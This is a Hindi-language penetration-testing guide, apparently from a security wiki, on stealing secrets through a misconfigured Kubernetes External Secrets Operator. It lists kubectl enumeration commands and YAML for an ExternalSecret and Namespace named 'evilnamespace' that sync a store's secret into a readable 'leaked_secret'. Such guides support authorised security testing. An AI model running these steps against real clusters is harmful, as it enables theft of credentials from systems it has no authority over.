# बाह्य रहस्य ऑपरेटर

**इस पृष्ठ के मूल लेखक हैं** [**फारेस**](https://www.linkedin.com/in/fares-siala/)

यह पृष्ठ कुछ संकेत देता है कि आप कैसे एक गलत रूप से एसओ या एप्लिकेशन से रहस्य चुरा सकते हैं जो अपने रहस्यों को सिंक करने के लिए एसओ का उपयोग करता है।

## अस्वीकृति

नीचे दिखाई गई तकनीक केवल उस समय काम कर सकती है जब कुछ विशेष परिस्थितियाँ पूरी होती हैं। उदाहरण के लिए, यह उसे आवश्यकताओं पर निर्भर करता है जो एक रहस्य को सिंक करने की अनुमति देने की आवश्यकता होती है जो आपके पास / अपहरित किए गए नामक्षेत्र पर है। आपको इसे खुद ही समझना होगा।

## पूर्वापेक्षाएँ

1. एक कुबरनेटीज / ओपनशिफ्ट क्लस्टर में एडमिन प्रिविलेज के साथ एक फुटहोल्ड
2. कम से कम क्लस्टर स्तर पर बाह्य रहस्य को पढ़ने की पहुंच
3. यह तय करें कि क्या कोई आवश्यक लेबल / एनोटेशन या समूह सदस्यता की आवश्यकता है जो एसओ को आपके रहस्य को सिंक करने की अनुमति देती है। अगर आप भाग्यशाली हैं, तो आप किसी भी परिभाषित रहस्य को स्वतंत्र रूप से चुरा सकते हैं।

### मौजूदा क्लस्टर सीक्रेट स्टोर के बारे में जानकारी एकत्र करना

मान लेते हैं कि आपके पास उस संसाधन को पढ़ने के लिए पर्याप्त अधिकार हैं; पहले मौजूदा _**क्लस्टर सीक्रेट स्टोर्स**_ की सूची बनाकर शुरू करें।
```sh
kubectl get ClusterSecretStore
```
### बाह्य सीक्रेट गणना

चलो मान लेते हैं कि आपने एक ClusterSecretStore जिसका नाम _**mystore**_ है, पाया है। इसके बाद इसके संबंधित externalsecret की गणना करें।
```sh
kubectl get externalsecret -A | grep mystore
```
_यह संसाधन नेमस्पेस स्कोप का है, इसलिए जब तक आप पहले से पता नहीं कर लेते कि आपको किस नेमस्पेस की तलाश है, तो सभी नेमस्पेस के लिए देखने के लिए -A विकल्प जोड़ें।_



_आपको परिभाषित externalsecret की सूची मिलनी चाहिए। यह मान लें कि आपने नेमस्पेस _**mynamespace**_ द्वारा परिभाषित और उपयोग किया गया externalsecret ऑब्जेक्ट _**mysecret**_ पाया है। यह जानने के लिए और अधिक जानकारी जुटाएं कि यह किस प्रकार का सीक्रेट रखता है।_
```sh
kubectl get externalsecret myexternalsecret -n mynamespace -o yaml
```
### टुकड़े जोड़ना

यहाँ से आप एक या एक से अधिक रहस्य नाम प्राप्त कर सकते हैं (जैसे कि रहस्य संसाधन में परिभाषित किया गया है)। आपको एक आउटपुट प्राप्त होगा जैसे:
```yaml
kind: ExternalSecret
metadata:
annotations:
...
labels:
...
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
...
```
```html
<p>अब तक हमें मिला है:</p>

<ul>
<li>ClusterSecretStore का नाम</li>
<li>ExternalSecret का नाम</li>
<li>रहस्य का नाम</li>
</ul>

<p>अब जब हमारे पास सब कुछ है, तो आप एक ExternalSecret बना सकते हैं (और अंततः एक नए Namespace को पैच/बना सकते हैं ताकि आपके नए रहस्य को सिंक करने के लिए आवश्यक पूर्वापेक्षाएं पूरी हों):</p>
```
```yaml
kind: ExternalSecret
metadata:
name: myexternalsecret
namespace: evilnamespace
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
refreshInterval: 30s
secretStoreRef:
kind: ClusterSecretStore
name: mystore
target:
creationPolicy: Owner
deletionPolicy: Retain
name: leaked_secret
```

```yaml
kind: Namespace
metadata:
annotations:
required_annotation: value
other_required_annotation: other_value
labels:
required_label: somevalue
other_required_label: someothervalue
name: evilnamespace
```
कुछ मिनटों के बाद, यदि सिंक शर्तें पूरी हो गईं थीं, तो आपको अपने नेमस्पेस के अंदर लीक किए गए रहस्य को देखने में सक्षम होना चाहिए।
```sh
kubectl get secret leaked_secret -o yaml
```
## संदर्भ

{% embed url="https://external-secrets.io/latest/" %}

{% embed url="https://github.com/external-secrets/external-secrets" %}
